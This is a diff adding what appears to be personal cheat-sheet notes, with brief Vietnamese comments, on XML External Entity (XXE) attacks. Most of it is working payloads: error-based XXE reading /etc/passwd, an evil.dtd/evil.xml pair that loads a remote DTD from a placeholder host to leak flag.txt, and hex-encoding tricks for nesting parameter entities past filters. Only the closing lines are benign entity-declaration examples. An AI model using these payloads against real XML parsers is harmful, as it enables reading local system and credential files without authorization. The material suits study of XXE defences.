@@ -1,0 +1,47 @@
+<?xml version="1.0" ?>
+	<!DOCTYPE message [
+		<!ELEMENT message ANY>
+		<!ENTITY b "123401012350240234">
+	]>
+<message>&b;</message>
+
+<?xml version="1.0" ?>
+	<!DOCTYPE message [
+		<!ELEMENT message ANY>
+		<!ENTITY % number '<!ENTITY % file SYSTEM "file:///etc/passwd">
+		<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///%file;'>"
+		%eval;
+		%error;			
+	'>
+	%number;
+]>
+Do Entity long nhau: Bypass sang hex 
+	'%' => &#x25; 
+	'&' => &#x26;
+	''' => &#x27;
+
+File evil.dtd
+
+<!ENTITY % file SYSTEM "file:///flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+File evil.xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://??/evil.dtd">%xxe]>
+<root><user>xxx</user></root>
+
+Khai bao thuc the trong
+
+<!ENTITY writer "Donald Duck.">
+<!ENTITY copyright "Copyright runoob.com">
+
+<author>&writer;&copyright;</author>
+
+Khai bao thuc the ngoai
+
+<!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd"> 
+<!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">
+
+&writer;&copyright;
